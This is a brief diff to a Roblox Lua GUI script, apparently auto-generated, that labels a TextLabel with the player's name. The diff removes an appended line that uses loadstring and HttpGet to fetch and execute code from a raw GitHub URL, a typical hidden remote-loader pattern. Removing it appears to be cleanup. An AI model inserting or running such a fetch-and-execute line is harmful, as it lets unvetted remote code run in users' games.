@@ -236,4 +236,3 @@ local function VQTQ_fake_script() -- TextLabel.LocalScript
 	script.Parent.Text = player.Name
 end
 coroutine.wrap(VQTQ_fake_script)()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ooaoaoaoaaooaoa/OpScriptGame/main/Dll"))();
